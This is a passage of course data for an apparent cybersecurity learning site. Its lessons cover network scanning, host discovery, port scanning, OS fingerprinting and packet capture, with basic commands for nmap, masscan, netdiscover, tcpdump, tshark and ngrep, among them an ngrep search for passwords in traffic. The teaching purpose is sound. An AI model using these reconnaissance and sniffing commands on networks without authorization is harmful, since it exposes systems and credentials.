              <p class="text-sm text-gray-300">Each open port represents a potential attack surface. Scanning detects services listening on ports (SSH, HTTP, FTP, databases) that may be misconfigured or vulnerable.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">Detecting Vulnerabilities Early</h3>
              <p class="text-sm text-gray-300">Scan results highlight outdated services and weak configurations, reducing the chance of successful attacks.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">Compliance & Security Audits</h3>
              <p class="text-sm text-gray-300">Regular scanning supports compliance with policies, regulations, and internal standards.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Network Scanning</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Ping Sweep:</span> Detects live hosts using ICMP.</li>
            <li><span class="font-semibold text-white">Port Scan:</span> Identifies open TCP/UDP ports.</li>
            <li><span class="font-semibold text-white">Service Detection:</span> Determines services and versions.</li>
            <li><span class="font-semibold text-white">OS Fingerprinting:</span> Infers host operating systems.</li>
          </ul>
          <p class="mb-6 text-gray-300">Network scanning is both defensive and offensive: defenders secure their networks, attackers plan exploits.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Role in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-2">
            <li>Map networks for penetration testing</li>
            <li>Identify potential attack vectors</li>
            <li>Test firewall configurations</li>
            <li>Understand lateral movement paths</li>
          </ul>
          <p class="mb-6 text-gray-300">Mastering network scanning is a prerequisite for tools like Nmap and Wireshark.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Network Scanning',
            content: `🛠 Tool Name: Nmap

Related Concept: Network Scanning & Host Discovery

What is Nmap?
Nmap (Network Mapper) is a powerful open-source tool used for network discovery, port scanning, and vulnerability mapping. It is widely used to enumerate live hosts, detect open ports, and perform OS fingerprinting.

Why This Tool Matches This Topic
Detects live hosts on networks
Performs detailed port scanning
Provides service and OS detection
Essential for penetration testing reconnaissance

Basic Commands
Scan a Single Host
nmap target_ip

Scan Multiple IPs
nmap 192.168.1.1 192.168.1.2

Scan a Range of IPs
nmap 192.168.1.1-50

Scan Specific Ports
nmap -p 22,80,443 target_ip

Service & Version Detection
nmap -sV target_ip

OS Fingerprinting
nmap -O target_ip`
          }
        ]
      },
      {
        title: 'Host Discovery',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Host discovery is the process of identifying live systems (hosts) on a network. Before performing any deep scanning or attacks, a cybersecurity professional must first know which machines are actually online. Host discovery reduces noise, saves time, and avoids unnecessary scans on inactive IP addresses.</p>
          <p class="mb-6 text-gray-300">In real‑world networks, not every IP address is active. Some systems may be powered off, blocked by firewalls, or configured to ignore certain requests. Host discovery helps build an accurate picture of the target environment.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Host Discovery is Important in Cyber Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify unauthorized devices on the network</li>
            <li>Detect rogue systems or IoT devices</li>
            <li>Validate network segmentation</li>
            <li>Monitor network growth and changes</li>
          </ul>
          <p class="mb-6 text-gray-300">Attackers also use host discovery as the first step of reconnaissance, making it an essential concept for defenders to understand.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Host Discovery Techniques</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">ICMP Echo Requests (Ping Scans)</h3>
              <p class="text-sm text-gray-300">Sends ICMP packets to detect if hosts respond. Some systems block ICMP for security reasons.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">TCP SYN Ping</h3>
              <p class="text-sm text-gray-300">Sends SYN packets to common ports to detect live systems even if ICMP is blocked.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">ARP Scanning</h3>
              <p class="text-sm text-gray-300">Used within local networks to discover live hosts based on ARP responses. Extremely reliable inside LAN environments.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">UDP Probes</h3>
              <p class="text-sm text-gray-300">Sends UDP packets to detect systems that respond on UDP services.</p>
            </div>
          </div>
          <p class="mb-6 text-gray-300">Each method has advantages and limitations, depending on firewalls and network configurations.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Host Discovery in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Detect unknown or unauthorized devices</li>
            <li>Monitor network health</li>
            <li>Identify exposed systems</li>
            <li>Strengthen firewall rules</li>
          </ul>
          <p class="mb-6 text-gray-300">This information helps improve network visibility and reduce blind spots.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Host Discovery in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Minimize scan footprint</li>
            <li>Avoid unnecessary noise</li>
            <li>Identify pivot points for lateral movement</li>
            <li>Understand network segmentation</li>
          </ul>
          <p class="mb-6 text-gray-300">Proper host discovery leads to more accurate and efficient penetration testing.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Host Discovery',
            content: `🛠 Tool Name: netdiscover

Related Concept: Host Discovery & ARP Scanning

What is netdiscover?
netdiscover is a Kali Linux tool used for active and passive ARP reconnaissance. It is highly effective in discovering live hosts on a local network, even when ICMP ping is blocked.

Why This Tool Matches This Topic
Discovers live hosts on LAN
Uses ARP, which is hard to block internally
Lightweight and fast
Ideal for internal network testing

Basic Commands
Run Passive ARP Scan
sudo netdiscover

Scan a Specific Network Range
sudo netdiscover -r 192.168.1.0/24

Active Mode Scan
sudo netdiscover -i eth0 -r 192.168.1.0/24`
          }
        ]
      },
      {
        title: 'Port Scanning Techniques',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Port scanning is a core concept in cybersecurity reconnaissance. Once live hosts are identified, the next step is to determine which network ports are open and what services are listening on those ports. Every open port represents a possible entry point into a system, making port scanning one of the most critical phases of penetration testing and network defense.</p>
          <p class="mb-6 text-gray-300">Ports act as communication endpoints for services such as web servers, databases, mail servers, and remote access tools. Understanding how ports behave allows security professionals to assess risks and harden systems effectively.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Port Scanning Matters</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Exposed services</li>
            <li>Misconfigured applications</li>
            <li>Unnecessary open ports</li>
            <li>Legacy or insecure services</li>
          </ul>
          <p class="mb-6 text-gray-300">From a defensive standpoint, port scanning allows organizations to minimize their attack surface. From an offensive standpoint, attackers rely on port scanning to plan exploits.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Port Scanning Techniques</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">TCP Connect Scan</h3>
              <p class="text-sm text-gray-300">Completes the full TCP handshake. Reliable but easily detected and logged by firewalls and IDS systems.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">TCP SYN Scan (Stealth Scan)</h3>
              <p class="text-sm text-gray-300">Sends a SYN packet and analyzes responses without completing the handshake. Faster and sometimes less detectable than connect scans.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">UDP Scan</h3>
              <p class="text-sm text-gray-300">Identifies services running on UDP ports. Slower and more complex due to lack of acknowledgments and common rate-limiting.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">FIN, NULL, and Xmas Scans</h3>
              <p class="text-sm text-gray-300">Send unusual TCP packets to bypass simple firewall rules and infer open ports based on responses or lack thereof.</p>
            </div>
          </div>
          <p class="mb-6 text-gray-300">Each scanning technique serves a different purpose depending on stealth requirements and network defenses.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Port Scanning in Real‑World Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Validate firewall rules</li>
            <li>Identify exposed services</li>
            <li>Detect shadow IT</li>
            <li>Support vulnerability assessments</li>
          </ul>
          <p class="mb-6 text-gray-300">Ethical hackers use port scanning to simulate attacker behavior in a controlled and authorized manner.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Security Risks of Open Ports</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Services are outdated</li>
            <li>Default credentials are enabled</li>
            <li>Services are unnecessary</li>
            <li>Firewalls are misconfigured</li>
          </ul>
          <p class="mb-6 text-gray-300">Closing unused ports and monitoring exposed services significantly improves security posture.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Port Scanning',
            content: `🛠 Tool Name: masscan

Related Concept: High‑Speed Port Scanning

What is masscan?
masscan is an extremely fast port scanning tool capable of scanning entire networks in seconds. It is designed for large‑scale scanning and is commonly used in security research and enterprise environments.

Why This Tool Matches This Topic
Performs high‑speed port scans
Identifies open ports quickly
Useful for large networks
Complements Nmap scanning

Basic Commands
Scan Common Ports
sudo masscan target_ip -p80,443

Scan Full Port Range
sudo masscan target_ip -p1-65535

Set Scan Rate
sudo masscan target_ip -p80 --rate 1000`
          }
        ]
      },
      {
        title: 'Nmap Basic Commands',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Nmap (Network Mapper) is one of the most important tools in cybersecurity. It is used by ethical hackers, network administrators, SOC analysts, and penetration testers to discover hosts, scan ports, identify services, and detect operating systems. Understanding Nmap basics is essential before moving to advanced enumeration and scripting.</p>
          <p class="mb-6 text-gray-300">Nmap provides detailed visibility into network environments and helps security professionals understand how systems are exposed to the network.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Nmap is Essential in Cyber Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identifying live hosts</li>
            <li>Discovering open TCP and UDP ports</li>
            <li>Detecting service versions</li>
            <li>Mapping network security posture</li>
            <li>Testing firewall and IDS behavior</li>
          </ul>
          <p class="mb-6 text-gray-300">Attackers and defenders both rely on Nmap, making it a must‑learn tool for students.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Basic Nmap Scan Types</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Default Scan</h3>
              <p class="text-sm text-gray-300">Performs a basic scan of the most common ports.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Port‑Specific Scan</h3>
              <p class="text-sm text-gray-300">Targets specific ports to reduce scan time and noise.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">Service Version Detection</h3>
              <p class="text-sm text-gray-300">Identifies the version of services running on open ports.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">OS Detection</h3>
              <p class="text-sm text-gray-300">Attempts to identify the target’s operating system.</p>
            </div>
          </div>
          <p class="mb-6 text-gray-300">These basic scans form the foundation for advanced enumeration.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Understanding Nmap Output</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Open, closed, or filtered ports</li>
            <li>Service names and versions</li>
            <li>Host latency</li>
            <li>OS guesses</li>
          </ul>
          <p class="mb-6 text-gray-300">Interpreting Nmap results accurately is a critical cybersecurity skill.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Ethical Usage of Nmap</h2>
          <p class="mb-6 text-gray-300">Nmap must only be used on systems where you have explicit authorization. Unauthorized scanning can be illegal and may trigger security alerts.</p>
        `,
        duration: '25 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Nmap Utility',
            content: `🛠 Tool Name: zenmap

Related Concept: Nmap Visualization & Analysis

What is zenmap?
Zenmap is the official graphical user interface (GUI) for Nmap. It helps beginners visualize scan results, save scan profiles, and understand Nmap outputs more clearly.

Why This Tool Matches This Topic
Simplifies learning Nmap
Visualizes scan results
Supports predefined scan profiles
Ideal for students

Basic Commands
Launch Zenmap
zenmap

Quick Scan Profile
nmap -T4 -F target_ip

Intense Scan Profile
nmap -T4 -A target_ip`
          }
        ]
      },
      {
        title: 'OS Fingerprinting (Nmap)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">OS Fingerprinting is the process of identifying the operating system running on a target machine by analyzing how it responds to specific network probes. Different operating systems implement TCP/IP stacks in slightly different ways. These subtle differences allow tools like Nmap to make educated guesses about whether a system is running Windows, Linux, macOS, or other operating systems.</p>
          <p class="mb-6 text-gray-300">In cybersecurity, knowing the operating system of a target is extremely valuable because exploits, attack techniques, and defenses are often OS‑specific.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why OS Fingerprinting is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Default open ports</li>
            <li>Service configurations</li>
            <li>Patch management</li>
            <li>Vulnerabilities and exploits</li>
          </ul>
          <p class="mb-6 text-gray-300">By identifying the OS, security professionals can select appropriate tests, identify outdated or unsupported systems, improve incident response, and strengthen defensive strategies. Attackers also rely on OS fingerprinting to tailor their attack methods.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Active vs Passive OS Fingerprinting</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Active OS Fingerprinting</h3>
              <p class="text-sm text-gray-300">Sends crafted packets to a target and analyzes responses. Nmap uses this method with the <code>-O</code> option enabled. Accurate but more detectable.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Passive OS Fingerprinting</h3>
              <p class="text-sm text-gray-300">Analyzes existing network traffic without sending probes. Stealthier but often less precise.</p>
            </div>
          </div>
          <p class="mb-6 text-gray-300">Understanding both methods helps security professionals balance accuracy and stealth.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">OS Fingerprinting in Real‑World Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Inventory systems</li>
            <li>Detect unauthorized operating systems</li>
            <li>Identify legacy systems</li>
            <li>Support vulnerability management programs</li>
          </ul>
          <p class="mb-6 text-gray-300">In penetration testing, OS fingerprinting guides the next phase of exploitation.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Limitations of OS Fingerprinting</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Firewalls may block probes</li>
            <li>NAT devices may interfere</li>
            <li>Some systems intentionally obscure responses</li>
            <li>Results are probabilistic, not guaranteed</li>
          </ul>
          <p class="mb-6 text-gray-300">Despite limitations, OS fingerprinting remains a critical reconnaissance technique.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Passive OS Fingerprinting',
            content: `🛠 Tool Name: p0f

Related Concept: Passive OS Fingerprinting

What is p0f?
p0f is a passive network fingerprinting tool that identifies operating systems, network distance, and NAT usage by analyzing live network traffic without sending any packets.

Why This Tool Matches This Topic
Performs passive OS detection
Stealthy and non‑intrusive
Useful in monitoring environments
Complements Nmap OS detection

Basic Commands
Start p0f on Interface
sudo p0f -i eth0

Analyze Traffic from a PCAP File
sudo p0f -r capture.pcap`
          }
        ]
      },
      {
        title: 'Introduction to Wireshark',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Wireshark is the world’s most widely used network packet analyzer. It allows cybersecurity professionals to capture, inspect, and analyze network traffic in real time. Every action on a network—opening a website, sending credentials, downloading files—travels as packets, and Wireshark makes these packets visible.</p>
          <p class="mb-6 text-gray-300">In cybersecurity, visibility is power. Wireshark gives deep insight into how data flows across a network and helps detect attacks, misconfigurations, and data leaks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Wireshark is Important in Cyber Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Detect suspicious traffic patterns</li>
            <li>Identify malware communication</li>
            <li>Analyze unencrypted credentials</li>
            <li>Troubleshoot network issues</li>
            <li>Perform forensic investigations</li>
          </ul>
          <p class="mb-6 text-gray-300">Attackers try to hide within normal traffic. Wireshark helps defenders spot abnormal behavior by examining packet structure and flow.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">How Wireshark Works</h2>
          <p class="mb-3 text-gray-300">Wireshark captures packets from a network interface and decodes them into human‑readable form. It breaks packets into layers such as:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Frame</li>
            <li>Ethernet</li>
            <li>IP</li>
            <li>TCP/UDP</li>
            <li>Application Layer (HTTP, DNS, FTP, etc.)</li>
          </ul>
          <p class="mb-6 text-gray-300">Understanding these layers helps security professionals analyze where attacks occur.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Wireshark in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Capture credentials on insecure protocols</li>
            <li>Analyze MITM attacks</li>
            <li>Study protocol behavior</li>
            <li>Validate encryption usage</li>
          </ul>
          <p class="mb-6 text-gray-300">Wireshark is commonly used in labs to demonstrate why encryption is critical.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Wireshark in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Investigate security incidents</li>
            <li>Identify command‑and‑control traffic</li>
            <li>Analyze malware behavior</li>
            <li>Support SOC investigations</li>
          </ul>
          <p class="mb-6 text-gray-300">Wireshark is often the first tool used during incident response.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Legal & Ethical Use</h2>
          <p class="mb-6 text-gray-300">Packet capturing may expose sensitive data. Wireshark must only be used on networks where you have explicit authorization. Unauthorized packet capture is illegal.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Packet Capture Tool',
            content: `🛠 Tool Name: tshark

Related Concept: Packet Capturing & Traffic Analysis

What is tshark?
tshark is the command‑line version of Wireshark. It allows packet capturing and analysis directly from the terminal, making it ideal for servers, automation, and remote analysis.

Why This Tool Matches This Topic
CLI version of Wireshark
Useful for scripting and automation
Works on headless systems
Industry‑standard packet analysis tool

Basic Commands
Capture Packets on an Interface
sudo tshark -i eth0

Capture Specific Number of Packets
sudo tshark -i eth0 -c 100

Save Packets to a File
sudo tshark -i eth0 -w capture.pcap`
          }
        ]
      },
      {
        title: 'Packet Capturing Techniques',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Packet capturing is the process of intercepting and recording network packets as they travel across a network. Every communication on a network—web requests, logins, file transfers, emails—is broken into packets. By capturing these packets, cybersecurity professionals can analyze what data is being transmitted, how it is structured, and whether it is secure.</p>
          <p class="mb-6 text-gray-300">Packet capturing is a critical skill in network security, incident response, malware analysis, and digital forensics.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Packet Capturing is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Detect malicious activity</li>
            <li>Identify data leaks</li>
            <li>Analyze unencrypted credentials</li>
            <li>Troubleshoot network problems</li>
            <li>Investigate security incidents</li>
          </ul>
          <p class="mb-6 text-gray-300">Many attacks leave traces in network traffic. Packet captures provide evidence that can be used to understand and respond to attacks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Packet Capturing Methods</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Live Packet Capture</h3>
              <p class="text-sm text-gray-300">Capturing traffic in real time from a network interface. Useful for monitoring ongoing activity and detecting active attacks.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Offline Packet Analysis</h3>
              <p class="text-sm text-gray-300">Analyzing previously captured .pcap files. Common in forensic investigations where traffic has already been recorded.</p>
            </div>
            <div class="p-3 rounded border border-yellow-500/20 bg-yellow-500/5">
              <h3 class="text-lg font-semibold text-yellow-400 mb-1">Promiscuous Mode Capture</h3>
              <p class="text-sm text-gray-300">Allows capturing all traffic on a network segment, not just packets destined for the local machine. Useful in monitoring and attack detection.</p>
            </div>
            <div class="p-3 rounded border border-purple-500/20 bg-purple-500/5">
              <h3 class="text-lg font-semibold text-purple-400 mb-1">Filtered Capture</h3>
              <p class="text-sm text-gray-300">Capturing only specific traffic (e.g., HTTP or DNS) to reduce noise and focus on relevant data.</p>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Packet Capturing in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Demonstrate insecure protocols</li>
            <li>Analyze man‑in‑the‑middle attacks</li>
            <li>Validate encryption implementation</li>
            <li>Understand protocol weaknesses</li>
          </ul>
          <p class="mb-6 text-gray-300">Packet capturing helps students visually understand how attacks work.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Packet Capturing in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Investigate malware traffic</li>
            <li>Analyze command‑and‑control communication</li>
            <li>Support intrusion detection systems</li>
            <li>Perform post‑incident analysis</li>
          </ul>
          <p class="mb-6 text-gray-300">Packet captures often serve as legal and technical evidence.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Ethical and Legal Considerations</h2>
          <p class="mb-6 text-gray-300">Packet capturing can expose sensitive information such as passwords and personal data. It must only be done on networks where explicit permission has been granted.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Advanced Packet Capture',
            content: `🛠 Tool Name: tcpdump

Related Concept: Packet Capturing Techniques

What is tcpdump?
tcpdump is a powerful command‑line packet analyzer that allows users to capture and inspect network packets efficiently. It is widely used for real‑time traffic analysis and forensic investigations.

Why This Tool Matches This Topic
Lightweight and fast
Works without GUI
Supports advanced filtering
Common in incident response

Basic Commands
Capture Packets on an Interface
sudo tcpdump -i eth0

Capture Traffic from a Specific Host
sudo tcpdump host 192.168.1.10

Capture Specific Protocol (TCP)
sudo tcpdump tcp

Save Capture to File
sudo tcpdump -i eth0 -w traffic.pcap`
          }
        ]
      },
      {
        title: 'Filtering Traffic in Wireshark',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">When capturing network traffic, thousands or even millions of packets can be generated within minutes. Without filtering, analyzing this data becomes extremely difficult. Traffic filtering allows cybersecurity professionals to focus only on relevant packets, making analysis faster, clearer, and more effective.</p>
          <p class="mb-6 text-gray-300">Wireshark provides powerful filtering mechanisms that help analysts isolate specific protocols, IP addresses, ports, and packet behaviors.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Traffic Filtering is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Reduce noise in packet captures</li>
            <li>Identify suspicious communication</li>
            <li>Focus on specific attacks or protocols</li>
            <li>Speed up incident response</li>
            <li>Improve forensic accuracy</li>
          </ul>
          <p class="mb-6 text-gray-300">In real‑world investigations, time is critical. Effective filtering can quickly reveal malicious activity hidden in normal traffic.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Filters in Wireshark</h2>
          <div class="space-y-3 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">Capture Filters</h3>
              <p class="text-sm text-gray-300">Applied before packet capture starts. They reduce the amount of data captured and save storage space.</p>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">Display Filters</h3>
              <p class="text-sm text-gray-300">Applied after capture. They allow analysts to dynamically search and analyze packets without modifying the original capture.</p>
            </div>
          </div>
          <p class="mb-6 text-gray-300">Understanding both filter types is essential for efficient packet analysis.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Filtering Scenarios</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Isolate HTTP or DNS traffic</li>
            <li>Detect clear‑text credentials</li>
            <li>Identify suspicious IP addresses</li>
            <li>Analyze failed login attempts</li>
            <li>Track malware communication</li>
          </ul>
          <p class="mb-6 text-gray-300">Filtering allows analysts to reconstruct events during an attack.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Filtering in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Capture credentials on insecure protocols</li>
            <li>Analyze MITM attacks</li>
            <li>Validate encryption</li>
            <li>Study application behavior</li>
          </ul>
          <p class="mb-6 text-gray-300">Filtering makes learning and demonstrations more effective.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Filtering in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Investigate alerts from IDS/IPS</li>
            <li>Analyze malware traffic</li>
            <li>Support forensic investigations</li>
            <li>Improve SOC efficiency</li>
          </ul>
          <p class="mb-6 text-gray-300">Filtering is a core skill for SOC analysts and incident responders.</p>
        `,
        duration: '25 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Packet Filtering',
            content: `🛠 Tool Name: ngrep

Related Concept: Traffic Filtering & Pattern Matching

What is ngrep?
ngrep (Network Grep) is a Kali Linux tool that allows pattern matching within network traffic, similar to the Linux grep command. It is used to search for keywords, strings, or patterns inside packets in real time.

Why This Tool Matches This Topic
Filters traffic based on content
Searches for keywords in packets
Useful for credential detection
Lightweight and fast

Basic Commands
Capture HTTP Traffic
sudo ngrep -d eth0 "GET" tcp port 80

Search for Password Keyword
sudo ngrep -i "password" tcp

Monitor Traffic on Specific Port
sudo ngrep -d eth0 port 21`
          }
        ]
      },
      {
        title: 'Basic TCP/UDP Analysis',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">TCP and UDP are the most common transport-layer protocols. Understanding how they behave on the wire helps you troubleshoot performance issues, detect anomalies, and identify potential attacks. This lesson covers core analysis points for both protocols as seen in packet captures.</p>
          <p class="mb-6 text-gray-300">TCP is connection‑oriented and reliable; UDP is connection‑less and faster. Each has distinct indicators that you can observe in tools like Wireshark or Tshark.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">TCP Fundamentals</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Three‑way handshake: <code>SYN → SYN‑ACK → ACK</code></li>
            <li>Sequence and acknowledgment numbers track byte delivery</li>
            <li>Flags: <code>SYN</code>, <code>ACK</code>, <code>FIN</code>, <code>RST</code>, <code>PSH</code>, <code>URG</code></li>
            <li>Flow control using window size; congestion control adapts to network conditions</li>
            <li>Retransmissions and duplicate ACKs indicate packet loss</li>
            <li><code>RST</code> suggests abrupt termination or blocked connections</li>
          </ul>
          <p class="mb-6 text-gray-300">When analyzing TCP, focus on handshake completion, latency between segments, retransmission rates, window scaling, and resets. These reveal connectivity and performance issues.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">UDP Fundamentals</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Connection‑less and no built‑in reliability or ordering</li>
            <li>Common in DNS, DHCP, VoIP, streaming, and gaming</li>
            <li>Application layer often handles loss, retries, and timing</li>
            <li>Packet size and frequency patterns reveal application behavior</li>
          </ul>
          <p class="mb-6 text-gray-300">For UDP analysis, look for missing responses (e.g., DNS queries without answers), bursty traffic, jitter patterns in VoIP, and unusual ports or payloads.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What to Look For</h2>
          <div class="grid md:grid-cols-2 gap-4 mb-6">
            <div class="p-3 rounded border border-blue-500/20 bg-blue-500/5">
              <h3 class="text-lg font-semibold text-blue-400 mb-1">TCP Analysis</h3>
              <ul class="list-disc pl-5 text-sm text-gray-300 space-y-1">
                <li>Handshake success and timing (SYN/SYN‑ACK/ACK)</li>
                <li>Retransmissions, duplicate ACKs, out‑of‑order segments</li>
                <li>Window size changes and zero‑window conditions</li>
                <li>Resets (<code>RST</code>) and abnormal terminations</li>
                <li>Application behavior (HTTP verbs, TLS handshakes)</li>
              </ul>
            </div>
            <div class="p-3 rounded border border-green-500/20 bg-green-500/5">
              <h3 class="text-lg font-semibold text-green-400 mb-1">UDP Analysis</h3>
              <ul class="list-disc pl-5 text-sm text-gray-300 space-y-1">
                <li>Request/response pairs (DNS, NTP)</li>
                <li>Unanswered queries or excessive retries</li>
                <li>Jitter and packet loss in RTP/VoIP</li>
                <li>Port usage and payload patterns</li>
                <li>Unexpected services on high/ephemeral ports</li>
              </ul>
            </div>
          </div>

          <h2 class="text-xl font-semibold mb-3 text-white">Why This Analysis Matters</h2>
